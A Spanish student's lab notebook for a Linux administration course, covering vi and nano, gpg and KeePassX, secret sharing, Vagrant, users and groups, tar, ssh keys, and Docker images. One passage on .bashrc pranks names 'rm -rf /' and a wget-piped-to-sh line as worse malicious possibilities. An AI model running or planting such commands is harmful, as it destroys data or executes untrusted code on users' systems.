# Práctica 1

## 2021.09.22

### Práctica 1.1. Directorios de las prácticas
Hemos creado el directorio del que colgarán todo el resto de práticas y los directorios indicados en el enunciado.

### Práctica 1.2. Uso básico de vi
En este apartado se nos pide que escribamos y corrijamos unos titulares para familiarizarnos con el uso de vi.

### Práctica 1.3. Uso de un editor sin gráficos
Considero que vi tiene mucho potencial pero el editor que he elegido es nano, debido a su manejo sencillo
y a que ya estoy acostumbrado a su uso.

En vi los dos modos principales son:

 - a - Pasa de modo orden a modo insertar
 - Esc - Pasa de modo insertar a modo orden (Empiezan por ':')

Alguno de los atajos que hemos aprendido en vi han sido:

 - :w - Escribe
 - :q - Salir
 - :q! - Salir sin guardar (Fuerza la salida)
 - :wq - Salir y guardar

En nano los principales atajos de teclado son:

 - Ctrl + O - Guardar
 - Ctrl + X - Salir
 - Ctrl + K - Cortar
 - Ctrl + U - Pegar
 - Ctrl + W - Buscar

En esta sesión también hemos aprendido el uso de markdown y de pandoc.

pandoc -s practica01.md -o ejemplo.html lo utilizado para pasar este mismo documento a html a modo de prueba. Aparece un
warning porque el documento no tiene título.

### Práctica 1.4. Gestión de contraseña
En este apartado se trabaja con la gestión de contraseñas haciendo uso de gpg, LibreOffice y KeePassx

#### gpg
En primer lugar he creado el fichero contraseñas.txt con 3 contraseñas de prueba.
Para cifrar este fichero de texto haciendo uso de gpg:
gpg -c contraseñas.txt
De esta manera se habrá creado contraseñas.txt.gpg, que está cifrado.
En el caso de querer descifrar este fichero para poder acceder a su contenido:
gpg -d contraseñas.txt.gpg
En la salida muestra el tipo de cifrado (AES256), y el propio fichero

#### LibreOffice
En este caso vamos a repetir lo realizado anteriormente pero usando LibreOffice.
He creado el documento de texto "contraseñas.odt", para ponerle una contraseña:
Guardar como > Añadir contraseña
Pide que introduzcas una contraseña
Al intentar abrir el archivo te pide la contraseña para poder acceder a la información

#### KeePassX
Para usar KeePassX

 - Abrir la aplicación
 - Base de datos > Nueva base de datos
 - Una vez tenemos la base de datos, click derecho en raiz, añadir nuevo grupo
 - En la barra superior entradas > añadir nueva entrada
 - Aparece una pantalla en la uqe se establece: nombre de usuario (vrincon en mi caso)
   titulo de entrada y contraseña
 - Basta con entrar y copiar sin nunca verla

En mi caso he asignado una contraseña y un archivo llave, "archivollave.txt", que guardaré en este mismo directorio solo a modo de prueba.
Cada vez que se inicie la apliacion se pedira contraseña y archivo llave.

He creado un recordatorio de las contraseñas en el escritorio, contraseñas_lagrs
Todo lo he hecho exclusivamente a modo de prueba.

### Práctica 1.5. Secret Sharing
Asi he realizado este apartado:

-t indica el numero de partes que se necesitan para recuperar la contraseña
-n indica el numero de partes en los que se divide la contraseña

```
vrincon@f-l2108-pc07:~/lagrs/practica01$ ssss-split -t 4 -n 6
Generating shares using a (4,6) scheme with dynamic security level.
Enter the secret, at most 128 ASCII characters: Using a 184 bit security level.
WARNING: binary data detected, use -x mode instead.
1-ab2768935536eb572060029d85dd4499ef392a70747ada
2-978a9837153cdb2d4fa5ffd30c79331ded6e6033e04109
3-094385bdd8e295a9b2c4dfbcb24f984730a575b18dda2b
4-c772d1856925e41e044f8fd61cbebe1aaee752946fddaa
5-31c76df97e90f0f94002e53fe9a1d52803d2edd9abe58a
6-dd93deb08a4c74445d9f8d7df656227ce078f2056c985d
vrincon@f-l2108-pc07:~/lagrs/practica01$ SSSS-COMBINE -t 4
SSSS-COMBINE: orden no encontrada
vrincon@f-l2108-pc07:~/lagrs/practica01$ ssss-combine -t 4
Enter 4 shares separated by newlines:
Share [1/4]: 1-ab2768935536eb572060029d85dd4499ef392a70747ada
Share [2/4]: 2-978a9837153cdb2d4fa5ffd30c79331ded6e6033e04109
Share [3/4]: 5-31c76df97e90f0f94002e53fe9a1d52803d2edd9abe58a
Share [4/4]: 3-094385bdd8e295a9b2c4dfbcb24f984730a575b18dda2b
Resulting secret: ESTO ES UNA CONTRASE..A
WARNING: binary data detected, use -x mode instead.
vrincon@f-l2108-pc07:~/lagrs/practica01$
```

Si a la hora de recuperar la contraseña pones mas de cuatro:

```
vrincon@f-l2108-pc07:~/lagrs/practica01$ ssss-combine -t 5
Enter 5 shares separated by newlines:
Share [1/5]: 4-c772d1856925e41e044f8fd61cbebe1aaee752946fddaa
Share [2/5]: 5-31c76df97e90f0f94002e53fe9a1d52803d2edd9abe58a
Share [3/5]: 1-ab2768935536eb572060029d85dd4499ef392a70747ada
Share [4/5]: 3-094385bdd8e295a9b2c4dfbcb24f984730a575b18dda2b
Share [5/5]: 2-978a9837153cdb2d4fa5ffd30c79331ded6e6033e04109
Resulting secret: yo/..$.7|....w.....w..4
WARNING: binary data detected, use -x mode instead
```
```
vrincon@f-l2108-pc07:~/lagrs/practica01$ ssss-combine -t 6
Enter 6 shares separated by newlines:
Share [1/6]: 1-ab2768935536eb572060029d85dd4499ef392a70747ada
Share [2/6]: 4-c772d1856925e41e044f8fd61cbebe1aaee752946fddaa
Share [3/6]: 5-31c76df97e90f0f94002e53fe9a1d52803d2edd9abe58a
Share [4/6]: 3-094385bdd8e295a9b2c4dfbcb24f984730a575b18dda2b
Share [5/6]: 2-978a9837153cdb2d4fa5ffd30c79331ded6e6033e04109
Share [6/6]: 6-dd93deb08a4c74445d9f8d7df656227ce078f2056c985d
Resulting secret: .>9...[XK...m.tY..%S2..
WARNING: binary data detected, use -x mode instead.
```

### Práctica 1.6. Vagrant
Para este apartado:

 - Creo el directorio vbox01 como project directory
 - Hago vagrant init ubuntu/focal64 para crear la maquina
 - vagrant up para descargar, instalar y configurar la maquina
 - vagrant ssh para conectarme a la maquina (Lo he hecho desde dos terminales para comprobar su funcionamiento editando archivos)
 - exit para salir de la maquina
 - vagrant halt para apagarla

Todo esto lo he hecho en el laboratorio.
La ventaja de vagrant es que es muy facil crear maquinas virtuales. La conexion ssh la hace por defecto desde el project directory

Revisando las prácticas pasado un tiempo, volvi a intentar crear una máquina usando vagrant y me encontre con este error:
```
vrincon@f-l2108-pc09:~/lagrs/vbox01$ vagrant up
Bringing machine 'default' up with 'virtualbox' provider...
There was an error while executing `VBoxManage`, a CLI used by Vagrant
for controlling VirtualBox. The command and stderr is shown below.

Command: ["list", "hostonlyifs"]

Stderr: VBoxManage: error: Failed to create the VirtualBox object!
VBoxManage: error: Document is empty.
VBoxManage: error: Location: '/home/alumnos/vrincon/.config/VirtualBox/VirtualBox.xml', line 1 (0), column 1.
VBoxManage: error: /home/vbox/vbox-6.1.30/src/VBox/Main/src-server/VirtualBoxImpl.cpp[740] (nsresult VirtualBox::init())
VBoxManage: error: Details: code NS_ERROR_FAILURE (0x80004005), component VirtualBoxWrap, interface IVirtualBox
```
Buscando en internet encontré esta solución:
```
vrincon@f-l2108-pc09:~/lagrs/vbox01$ cat /home/alumnos/vrincon/.config/VirtualBox/VirtualBox.xml-prev > /home/alumnos/vrincon/.config/VirtualBox/VirtualBox.xml
```
Ya todo funciona correctamente.

### Práctica 1.7. Usuarios y grupos
Inicio haciendo:
 - vagrant up
 - vagrant ssh
Una vez he iniciado hago:
 - sudo useradd user1 (he tenido que hacer antes sudo desde fuera de vagrant porque no me permitia dar de alta un usuario)
 - sudo passwd user1, introduzco la contraseña de prueba (user1)

Para abrir una sesion hago su user1 e introduzco la contraseña.
Intento ejecutar uan orden con sudo:
$ sudo ls
[sudo] password for user1:
user1 is not in the sudoers file.  This incident will be reported.

Para que pueda ejecutar sudo:
 - Salgo de esta sesion de user1
 - vagrant@ubuntu-focal:~$ sudo adduser user1 sudo
   Adding user `user1' to group `sudo' ...
   Adding user user1 to group sudo
   Done.
 - Ahora desde la sesion de user1 (su user1):
   $ sudo ls    
   [sudo] password for user1:
   otrodirectorio

Me pide el ejercicio que ahora cree dos nuevos grupos con user1 y añada a user1:
 - $ sudo groupadd grupo1
   $ sudo groupadd grupo2
 - $ groups user1
   user1 : user1 sudo
 - $ sudo adduser user1 grupo1
   Adding user `user1' to group `grupo1' ...
   Adding user user1 to group grupo1
   Done.
   $ sudo adduser user1 grupo2
   Adding user `user1' to group `grupo2' ...
   Adding user user1 to group grupo2
   Done.
 - $ groups user1
   user1 : user1 sudo grupo1 grupo2

Ya he comprobado que user1 estaba en los grupos que se especificaba.
Pruebo la orden newgrp:
$ groups
grupo1 sudo user1
$ newgrp grupo2
$ groups
grupo2 sudo user1 grupo1

newgrp grupo2 elige grupo2 como grupo primario.
Ademas ejecuta una shell con diferente GID
$ id
uid=1003(user1) gid=1003(user1) groups=1003(user1),27(sudo),1004(grupo1),1005(grupo2)

$ newgrp grupo1

$ id
uid=1003(user1) gid=1004(grupo1) groups=1004(grupo1),27(sudo),1003(user1),1005(grupo2)

Ha iniciado una nueva sesion de hecho habria que hacer exit para volver a la de user1. Podemos ver que ha cambiado la gid de 1003 a 1004
Si hago:

$ newgrp grupo2
$ id
uid=1003(user1) gid=1005(grupo2) groups=1005(grupo2),27(sudo),1003(user1),1004(grupo1)

Ahora el grupo principal es el dos y su gid es el 1005

### Práctica 1.8. tar

#### Uso de tar:
 - Comprimir:
   tar -cvzf fichero.tgz fichero1.txt fichero2.txt fichero3.txt fichero4.txt

 - Visualizar el contenido:
   vrincon@f-l2108-pc07:~/lagrs/practica01$ tar -xvzf fichero.tgz
   fichero1.txt
   fichero2.txt
   fichero3.txt
   fichero4.txt

 - Descomprimir:
   vrincon@f-l2108-pc07:~/lagrs/practica01$ tar -tzf fichero.tgz
   fichero1.txt
   fichero2.txt
   fichero3.txt
   fichero4.txt
#### Uso de bz2:
 - Comprimir un fichero, borrando el original:
   bzip2 fichero1.txt, ahora solo existe fichero1.txt.bz2

 - Descomprimirlo borrando el original:
   bunzip2 fichero1.txt.bz2, ahora solo existe el descomprimido

 - Comprimir manteniendo ambos:
   bzip2 -c fichero2.txt > fichero2.bz2
   Ahora podemos ver: fichero2.txt, fichero2.bz2

 - Descomprimir manteniendo ambos:
   bunzip2 -c fichero2.bz2 > fichero5.txt
   Ahora podemos ver ambos, fichero5.txt es el descomprimido

 - Comprimir varios manteniendo el original:
   tar -c fichero3.txt fichero4.txt | bzip2 > variosficheros.bz2

 - Descomprimir varios manteniendo el original:
   tar -xjf variosficheros.bz2

### Práctica 1.9. split

En primer lugar exporto la maquina Archivo > Exportar servicio virtualizado. Me pide el directorio donde se guardara la imagen.
He creado un directorio /aux en el directorio /practica01 y he dejado ahi el la ova.
md5sum vbox01_default_1633078167235_72896.ova > README.txt
Para sacar su hash MD5 y excribirlo de el fichero.

Comprimo el fichero aux en aux.tgz:
vrincon@f-l3109-pc07:~/lagrs/practica01$ tar -czvf aux.tgz aux
aux/
aux/README.txt
aux/vbox01_default_1633078167235_72896.ova

Para dividirlo en trozos:
- Veo el tamaño que tiene:
  du -sh aux.tgz (si quisiera ver todos los archivos uso asterico)
  584M	aux.tgz

- Lo divido en trozos de 200 MB:
  split -b 200MB aux.tgz aux.tgz.
  El segundo parametro es igual al primero pero con un punto al final, indica el prefijo.

- Hemos generado:
  aux.tgz.aa
  aux.tgz.ab
  aux.tgz.ac
  aux.tgz.ad

- du -sh aux.tgz.*
  191M	aux.tgz.aa
  191M	aux.tgz.ab
  191M	aux.tgz.ac
  12M	aux.tgz.ad

- Elimino la maquina desde virtualbox
- Elimino aux.tgz
- Elimino la ova de /aux

- Reconstruyo los trozos:
  cat aux.tgz.* > aux.tgz (Escribe por orden los trozos en un nuevo .tgz)

- Extraigo los arvhivos:
  tar -xvzf aux.tgz
  aux/
  aux/README.txt
  aux/vbox01_default_1633078167235_72896.ova

- El hash es correcto
- La maquina funciona.

### Práctica 1.10. ssh sin contraseñas
Los pasos que he seguido para poder acceder al laboratorio sin contraseña han sido:
 - ssh-keygen -t rsa, genero un par de claves publica-privada
 - Copio la clave publica generada en el fichero authorized_keys de /home/alumnos/vrincon/.ssh de la maquina remota (lab)
 - Doy los permisos pertinentes en ambas maquinas: chmod 600 a los archivos de dentro de /.ssh y chmod 700 a .ssh. (Tanto en la maquina local como en la remota)
 - ssh vrincon@f-l3109-pc04, funciona sin contraseña desde la maquina de vagrant.

### Práctica 1.11. ssh sin contraseñas desde el laboratorio.
En este caso lo que se pide es que se pueda entrar desde cualquier maquina a cualquier maquina desde dentro del laboratorio.
Para ello:
- ssh-keygen -t rsa, genero un par de claves publica-privada
- Copio la clave publica en el fichero authorized_keys (en este caso lo puedo hacer en la misma maquina)
- Doy los permisos pertinentes
- Ya puedo hacer ssh desde cualquier maquina, de hecho para comprobar he hecho ssh a f-l3209-pc08 y desde esa misma sesion he hecho ssh a f-l3109-pc05. Puedo usar ssh entre cualquiera de las maquinas de la organizacion sin usar contraseña.

### Práctica 1.12. FreeFileSync
Voy a sincronizar el ordenador de mi casa con el del laboratorio haciendo uso de FreefileSync

He creado dos carpetas, una es ~/simula_labo/lagrs y otra es ~/simula_casa/lagrs.
En simula_casa/lagrs he creado un fichero llamado doc.txt. No hay ninguno en simula_labo/lagrs.
Abro la herramienta de FreeFileSync > Comparar > Sincronizar, botón de la derecha.
He usado la sincronización bidreccional y ahora tengo en ambos directorios lo mismo.

### Práctica 1.13. Conflictos con FreeFileSync
Para simular el conflito he editado el fichero desde casa, no he sincronizado y desde el labo. Tras haber editado desde el labo he intentado sincronizar. Sale un rayo rojo inicador de que ha ocurrido un conflicto. Para resolverlo hay que hacerlo a mano y luego elegir si es el lado derecho o el izquierdo con el que te quieres quedar

### Práctica 1.14. Sincronización real de tu cuenta (Práctica recomendable)
Ya he instalado en mi ordenador personal FreeFileSync para poder tener un backup de mis prácticas

### Práctica 1.15 Invocación de la shell
¿Cuándo se ejecuta .bashrc? ¿Solamente en las shell de login? ¿Solamente en las shell que no son de login? ¿O en ambos tipos de shell? ¿Por qué?

.bashrc > en un bash interactivo, no de login
En un bash interactivo de login se ejecuta el .bash_profile, .bash_profile ó .profile, el que encuentre
Un bash que no sea interactivo es por ejemplo un script por lo que se ejecuta $BASH_ENV

En resumen, .bashrc se ejecuta cada vez que se inicia una nueva sesión de terminal en modo interactivo, bash_profile cuando sea una sesión de login, por ejemplo ssh. Actualmente la diferencia entre shell de login y no de lgin es algo artificial. Suele convenir que en ambos se tenga lo mismo

Una broma sin mucha maldad podría ser:
vrincon@f-l2108-pc09:~$ cat .bashrc
alias ls='clear'

Cada vez que se haga ls se limpiará todo el terminal. Otra pequeña broma podría ser alias cd='exit' de tal manera que al intentar hacer un cd se saldrá de la sesión. Se pueden hacer cosas mucho peores como un rm -rf/ o wget http://alguna_url -O- | sh que descarga y ejecuta ese script que puede ser maicioso.


### Apartado 1.16. Instalacion de docker
Instalacion de docker en mi maquina virtual:

sudo apt install docker.io
Para probar que la instalación ha sido correcta:
sudo docker run debian echo "hola mundo"

$> sudo docker run debian echo "hola mundo"
Unable to find image 'debian:latest' locally
latest: Pulling from library/debian
bb7d5a84853b: Pull complete
Digest: sha256:4d6ab716de467aad58e91b1b720f0badd7478847ec7a18f66027d0f8a329a43c
Status: Downloaded newer image for debian:latest
hola mundo

Como vemos, descarga la imagen debian, que no estaba descargada y ejecuta el hola mundo ahí.

Prueba de holamundo basada en ubuntu:
sudo docker run -it ubuntu echo "hola mundo"

$> sudo docker run -it ubuntu echo "hola mundo"
Unable to find image 'ubuntu:latest' locally
latest: Pulling from library/ubuntu
7b1a6ab2e44d: Pull complete
Digest: sha256:626ffe58f6e7566e00254b638eb7e0f3b11d4da9675088f4781a50ae288f3322
Status: Downloaded newer image for ubuntu:latest
hola mundo

### Práctica 1.17.Uso básico de imágenes
Creo un contenedor interactivo sin nombre:
sudo docker run -it ubuntu bash
root@6f9526f123a4:/# 
Ahora tengo una sesión de terminal para controlar el contenedor. He probado varios comandos(ls, cd, mkdir, touch, cat, df, clear) y parece que todas están disponibles, el comando ifconfig, por ejemplo, no lo está.

Creo un nuevo contenedor interactivo haciendo:
sudo docker run -it --name vrinc01 ubuntu bash

Me piden que liste los contenedores:
$> sudo docker ps
CONTAINER ID   IMAGE     COMMAND   CREATED              STATUS              PORTS     NAMES
08162bc0f5e6   ubuntu    "bash"    About a minute ago   Up About a minute             vrinc01
6f9526f123a4   ubuntu    "bash"    9 minutes ago        Up 9 minutes                  exciting_sinoussi

Como vemos, hay dos contenedores, el primero al que no le habíamos asignado un nombre tiene uno por defecto.
Tienen un identificador(CONTAINER ID), además aparecen otros datos como la imagen, cuando se creó o su estado.

$> sudo docker images
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
ubuntu       latest    ba6acccedd29   2 weeks ago   72.8MB
debian       latest    f776cfb21b5e   3 weeks ago   124MB

Podemos ver lo que ocupa la imagen, su id y cuando fue creada.

Cuando he cerrado los contenedores y hago sudo docker ps aparece vacío, porque ya no hay ningún contenedor lanzado.
Si hago sudo docker ps -a, puedo ver todos los contenedores, por lo que también se ve los hola mundo lanzados anteriormente.

sudo docker images sigue mostrando lo mismo, ya que son ficheros en almacenamiento.
En realidad, un contenedor no es más que la ejecución de una imagen.


### Práctica 1.18. Creación de una imagen de un contenedor
Me he creado una cuenta en docker hub

Para crear la imagen:
 - Creo un directorio de contexto
 - Escribo un entrypoint.sh
 - Instalo el paquete sysvbanner: sudo apt install sysvbanner

$> mkdir contextdocker
$> cd contextdocker/
$> touch entrypoint.sh
$> nano entrypoint.sh 
$> cat entrypoint.sh 
\#!/bin/bash
banner bienvenido
banner a
banner $HOSTNAME

Compruebo que el script funciona correctamente.
 
$> touch Dockerfile
$> nano Dockerfile 
$> cat Dockerfile 
FROM ubuntu:20.04
RUN apt-get update && apt-get upgrade -y && apt-get install -y sysvbanner
COPY entrypoint.sh /
ENTRYPOINT ["/entrypoint.sh"]

 - FROM imagen de partida
 - RUN lo que quieres ejecutar, en este caso instalar   sysvbanner con la opción -y para que no interactúe con el usuario.
 - COPY copia el fichero indicado desde el directorio de contexto hasta el futuro contenedor.
 - ENTRYPOINT indica el fichero que se ejecutará al iniciar el contenedor.

Para construir la imagen hago:
(IMPORTANTE: lo hago desde el directorio padre del directorio de contexto):
$> cd temp_lagrs/
$> ls
contextdocker  temp.md
En mi caso lo hago desde aquí

sudo docker build -t vrincon99/banner contextdocker

Para lanzar un contenedor con esa imagen:

$> sudo docker run vrincon99/banner

Esta última instrucción hace que se ejecute el banner y finalice, para que además muestre una shell añado bash en entryfile.sh

Para ejecutar esta modificación:
$> sudo docker build -t vrincon99/banner contextdocker
$> sudo docker run -it vrincon99/banner --> Añador la opción -it para que sea interativo.

Por último he de subir la imagen a docker hub, para ello:
$> sudo docker login
Login with your Docker ID to push and pull images from Docker Hub. If you don't have a Docker ID, head over to https://hub.docker.com to create one.
Username: vrincon99 
Password: 
WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
Configure a credential helper to remove this warning. See
https://docs.docker.com/engine/reference/commandline/login/#credentials-store

Login Succeeded
$> sudo docker push vrincon99/banner
Using default tag: latest
The push refers to repository [docker.io/vrincon99/banner]
4fb9454dd0a2: Pushed 
2997d0da3fd3: Pushed 
9f54eef41275: Mounted from library/ubuntu 
latest: digest: sha256:d71014d96d8824055dd8b7c97c54b4f31b6bf7ca70685f0796a7050f008c5326 size: 948


### Práctica 1.19. Servidor remoto

Ahora en lugar de usar una máquina virtual o mi propio ordenador personal vamos a hacerlo desde el laboratorio:
cliente docker será mi puesto
servidor docker será una máquina del laboratorio configurada para este propósito.
Se puede acceder (sólo desde el laboratorio) a la máquina dockerio, dirección 10.110.100.21, que es un servidor de contenedores para los estudiantes de esta asignatura.

Configuro el puesto del laboratorio para poder usar dockerio como servidor de docker:

Repito las prácticas 1.17 y 1.18:

docker run -it --name vrinc01 ubuntu bash, nuevo contenedor interactivo con ese nombre
docker ps -a, para ver los contenedores (veo también los de mis compañeros)
docker images, para ver las imagenes


### Práctica 1.20. Creación de una imagen personalizada

He creado cada uno de los scripts que me indican en el enunciado de manera que me queda:

 - construye.sh, /context y lanza_vrincal01 en /~lagrs/cal
 - Dockerfile y entrypoint.sh en /~lagrs/cal/context
 
construye.sh, script para construir la imagen vrincon/cal
lanza_vrincal01.sh, script para lanzar la imagen

De tal manera que:

 - construye.sh
 #!/bin/bash
 docker build -t vrincon/cal context

 - lanza_vrincal01.sh
 #!/bin/bash
 docker run --name vrincal01 vrincon/cal
 
 - Dockerfile
 vrincon@dockerio:~/lagrs/cal/context$ cat Dockerfile 
 FROM ubuntu:20.04
 RUN apt-get update && apt-get upgrade && apt-get install -y bsdmainutils
 COPY entrypoint.sh /
 ENTRYPOINT ["/entrypoint.sh"]

 - entrypoint.sh
 vrincon@dockerio:~/lagrs/cal/context$ cat entrypoint.sh 
 #!/bin/bash
 cal

Preparo el script lanza_vrincal03.sh (El dos lo he lanzado sin script para compobar si funcionaba)
#!/bin/bash
docker run --name vrincal03 vrincon/cal

Hay que recordar la importancia de los permisos de ejecución:
-rwxr-xr-x 1 vrincon alumnos   52 Nov  5 13:30 lanza_vrincal01.sh
-rwxr-xr-x 1 vrincon alumnos   52 Dec 12 12:26 lanza_vrincal03.sh
-rwxr-xr-x 1 vrincon alumnos   48 Nov  5 13:28 construye.sh

(chmod +x)

drwxr-xr-x 2 vrincon alumnos 4096 Nov  5 13:22 context

Haciendo docker ps -a:
872de3f4253a   vrincon/cal    "/entrypoint.sh"         2 minutes ago    Exited (0) 2 minutes ago              vrincal03
2af1fec69914   vrincon/cal    "/entrypoint.sh"         8 minutes ago    Exited (0) 8 minutes ago              vrincal02

Están basados en la misma imagen: vrincon/cal

Haciendo docker images aparece vrincon/cal 

### Práctica 1.21. Montaje bind

Un bind mount es un directorio del host que se comparte con más contenedores, se usa para la persistencia de datos.

Para realizar el montaje he seguido la especificación de nombres del enunciado.
Los diferentes scripts son:

 - construye.sh
 #!/bin/bash
 docker build -t vrincon/bind context

 - lanza_vrinbind01.sh
 En las transparencias indica que para hacer el bind mount has de usar una de las sintaxis indicadas, yo usé la tradicional
 #!/bin/bash
 docker run -it --name vrinbind01 -v $HOME:/home/vrincon vrincon/bind

 - Dockerfile
 Aqui actualizo, añado usuario y creo su home

 FROM ubuntu:20.04
 RUN apt-get update && apt-get upgrade -y
 RUN useradd -ms /bin/bash vrincon
 COPY entrypoint.sh /
 ENTRYPOINT ["/entrypoint.sh"]

 - entrypoint.sh
 Lanzo un terminal bash.
 
 #!/bin/bash
 /bin/bash

Con chmod +x doy permisos a los .sh

Lanzo construye.sh para hacer el build de la imagen
Lanzo lanza_vrinbind01.sh, funciona correctamente, se ha hecho el montaje
En mi home hago touch espersistente
Para comprobar que es persistente he borrado el contenedor: docker rm <id contenedor>

### Práctica 1.22. sshfs

Vamos a montar directorios que ahora no estan ubicados en el host del docker, sino que están en otro lugar de internet, en nuestro caso máquinas del laboratorio.
Vamos a montar los directorios /tmp de tres máquinas del laboratorio.
EL punto de montahe sera el directorio ~/lagrs/practica01
Para ello hago mkdir tmp01 tmp02 tmp03

Ahora compruebo que todo funciona:
 - Accedo a tmp01 y creo un fichero nuevo (estoesunficheronuevo)
 - Accedo por ssh a ese ordenador y veo que esta el fichero que he creado
 - Accedo por ssh a pc07 y hago touch otrofichero
 - otrofichero esta en tmp02

Todo funciona como esperábamos.

### Práctica 1.23.Contenedor con fichero hosts

He creado todos los ficheros con sus pertinentes permisos tal y como especifica el enunciado.
He copiado en delta_hosts el contenido del fichero /etc/hosts de uno de los puestos del laboratorio

Respecto al Dockerfile:
 - En el enunciado especifica que se copie el contenido de delta_hosts en /tmp (además del COPY entrypoint.sh / )
 - Haciendo uso de la orden RUN he instalado todos los paquetes necesarios para instalar ssh, ping e ifconfig
 - El enunciado epecifica que el contenedor debe estar configurado en castellano, por lo que instalo los paquetes que se indican en las transparencias y hago ENV LANG es_ES.UTF-8

A la hora de ejecutar me pregunta el area geográfica donde vivo, al seleccionarlo se queda congelado.
Haciendo una búsqueda rápida en internet he encontrado varias alternativas y una indica que:
ENV TZ=Europe/Minsk (yo lo hago con Madrid)
RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone

En los scripts para lanzar el contendero hay que conectarlo a la red:
docker run -it -h c03 --name c03 --rm --network=host test/im03 (transparencias)
He hecho: docker run -it -h vrincaa01 --name vrincaa01 --rm --network=host vrincon/caa 

Ahora todo funciona correctamente.
Cuando lanzo el contendor se inicia una sesión interactiva y puedo hacer ssh sin problema, por ejemplo ssh vrincon@f-l3209-pc03

### Práctica 1.24. COnectividad entre contenedores

En este caso se pide que las funcionalidades de este contenedor sean las mismas que las del anterior, por ello he copiado todo lo de caa a cab e iré modificando según sea necesario.

He seguido las transparencias para escribir el Dockerfile y el entrypoint.sh.
En el enunciado se especifica que hay que usar bridge, lo indico en el network de los sripts para lanzar los contenedores.

Haciendo ifconfig en cada una de las sesiones puedo comprobar que sus ip son diferentes (esto con host en lugar de bridge no ocurría, eran las mismas aun siendo diferentes sesiones)
Hago ping al otro contenedor y todo funciona correctamente.

En una sesión hago adduser vrincab01, contraseña el nombre, en la otra vrincab02, contraseña el nombre.
He entrado en cada uno de los usuarios haceindo login vrincab01 y su contraseña y login vrincab02 y su contraseña.
Para comprobar que todo funciona como esperamos: ssh vrincab01@172.17.0.2 (desde la otra sesión)

No funciona por lo que he cambiado el entrypoint.sh, que ahora queda:
#!/bin/bash
/etc/init.d/ssh start
cat /tmp/delta_hosts >> /etc/hosts
/bin/bash

Ahora todo funciona correctamente.

El resto de archivos quedan como:
 - Dockerfile:
 FROM ubuntu:20.04
 RUN echo "export TZ=Europe/Madrid" >> /etc/profile
 RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone
 RUN apt-get update && apt-get upgrade -y && apt-get install net-tools -y && apt>
 RUN mkdir /var/run/sshd
 # Con sshd, ENV no funciona. Para fijar una variable de entorno:
 # RUN echo "export MI_VARIABLE=mivalor" >> /etc/profile
 RUN echo "export LANG=es_ES.UTF-8" >> /etc/profile
 COPY entrypoint.sh /
 COPY delta_hosts /tmp

 # Esta instrucción no hace nada, solo indica el puerto TCP de escucha, es sólo >
 EXPOSE 22
 ENTRYPOINT ["/entrypoint.sh"]

 - construye.sh:
 #!/bin/bash
 docker build -t vrincon/cab context

 - lanza_vrincab01.sh:
 #!/bin/bash
 docker run -it -h vrincab01 --name vrincab01 --rm --network=bridge vrincon/cab
 
 - lanza_vrincab02.sh:
 #!/bin/bash
 docker run -it -h vrincab02 --name vrincab02 --rm --network=bridge vrincon/cab

(Además del fichero delta_hosts)

### Práctica 1.25. Control de integridad.

En este caso se me pregunta que averigue el nombre de algunas aplicaciones lanzadas gráficamente.
Esto lo voy a hacer desde mi ordenador porque lo encuentro útil para no depender en ciertas ocasiones del GUI.

Hago ps -ef > /tmp/1
Lanzo la apliación que quiero averiguar 
De nuevo ps -ef > /tmp/2

diff /tmp/1 /tmp/2 | grep vrincon, el grep lo añado para que haya menos lineas en la salida, ya que se que es un proceso que pertenecerá a mi usuario, se puede no poner.

> vrincon    13845    1876 12 21:14 ?        00:00:01 /usr/bin/seahorse --gapplication-service,su nombre es seahorse
> vrincon    13479    1876  2 21:06 ?        00:00:00 /usr/bin/gnome-screenshot --gapplication-service, su nombre es gnome-screenshot
> vrincon    13510    1876  7 21:07 ?        00:00:01 /usr/bin/gnome-todo --gapplication-service, su nombre es gnome-todo
> vrincon     2896    2640  2 17:13 ?        00:06:57 /usr/share/teams/teams --type=renderer --autoplay-policy..., su nombre es teams

### Práctica 1.26. Benchmark de cpu

Para conocer los bogoMIPS de un puesto:
vrincon@f-l2108-pc09:~$ dmesg | grep -i bogo
[    0.098720] Calibrating delay loop (skipped), value calculated using timer frequency.. 6399.96 BogoMIPS (lpj=12799920)
[    0.104454] smpboot: Total of 4 processors activated (25599.84 BogoMIPS)

En mi casa:
[    0.254563] Calibrating delay loop (skipped), value calculated using timer frequency.. 5789.14 BogoMIPS (lpj=11578280)
[    0.406606] smpboot: Total of 16 processors activated (92626.24 BogoMIPS)

Parece que mi portatil es más potente. 25599.84 < 92626.24

Voy a usar inxi para tener infomación detallada sobre algún puesto del laboratorio:

vrincon@f-l2108-pc09:~$ inxi -b
System:    Host: f-l2108-pc09 Kernel: 5.4.0-90-generic x86_64 bits: 64 Console: tty 1 
           Distro: Ubuntu 20.04.3 LTS (Focal Fossa) 
Machine:   Type: Desktop System: HP product: HP EliteDesk 800 G2 TWR v: N/A 
           serial: <superuser/root required> 
           Mobo: HP model: 8053 v: KBC Version 05.22 serial: <superuser/root required> 
           UEFI [Legacy]: HP v: N01 Ver. 02.12 date: 04/01/2016 
CPU:       Quad Core: Intel Core i5-6500 type: MCP speed: 899 MHz min/max: 800/3600 MHz 
Graphics:  Device-1: Intel HD Graphics 530 driver: i915 v: kernel 
           Display: server: X.org 1.20.13 driver: i915 tty: 106x24 
           Message: Advanced graphics data unavailable in console. Try -G --display 
Network:   Device-1: Intel Ethernet I219-LM driver: e1000e 
Drives:    Local Storage: total: 238.47 GiB used: 115.47 GiB (48.4%) 
Info:      Processes: 463 Uptime: 15h 29m Memory: 7.66 GiB used: 3.63 GiB (47.4%) Init: systemd 
           runlevel: 5 Shell: bash inxi: 3.0.38

En mi ordenador personal:

$>inxi -b 
System:    Host: vrincon-PROX15-AMD Kernel: 5.8.0-59-generic x86_64 bits: 64 Desktop: Gnome 3.36.9 
           Distro: Ubuntu 20.04.3 LTS (Focal Fossa) 
Machine:   Type: Laptop System: SLIMBOOK product: PROX15-AMD v: Standard serial: <superuser/root required> 
           Mobo: SLIMBOOK model: PROX15-AMD v: Standard serial: <superuser/root required> 
           UEFI: American Megatrends v: N.1.07GRP03 date: 12/11/2020 
Battery:   ID-1: BAT0 charge: 18.3 Wh condition: 91.6/91.6 Wh (100%) 
CPU:       8-Core: AMD Ryzen 7 4800H with Radeon Graphics type: MT MCP speed: 1397 MHz max: 1400 MHz 
